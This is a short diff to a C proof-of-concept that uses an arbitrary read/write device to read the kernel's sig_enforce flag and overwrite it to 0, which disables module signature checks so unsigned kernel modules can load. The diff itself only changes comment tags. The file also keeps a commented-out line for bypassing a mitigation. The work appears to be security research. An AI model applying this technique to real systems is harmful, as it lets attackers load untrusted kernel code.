@@ -1,4 +1,4 @@
-// FZY: Add a simple proof of concept that overwrites sig_enforce from 1 to 0, allowing unsigned kernel modules to be loaded
+// SDP: Add a simple proof of concept that overwrites sig_enforce from 1 to 0, allowing unsigned kernel modules to be loaded
 
 #include <fcntl.h>
 #include <stdbool.h>
@@ -161,7 +161,7 @@ int main(int argc, char *argv[]) {
     arb_read(arbrw_dev_fd, sig_enforce_addr, &sig_enforce_addr, sizeof(unsigned long));
     printf("[+] sig_enforce address from kernel: 0x%lx\n", sig_enforce_addr);
   
-    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
+    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
     // sig_enforce_addr = sig_enforce_addr | 0xFFFF000000000000;
   }
   
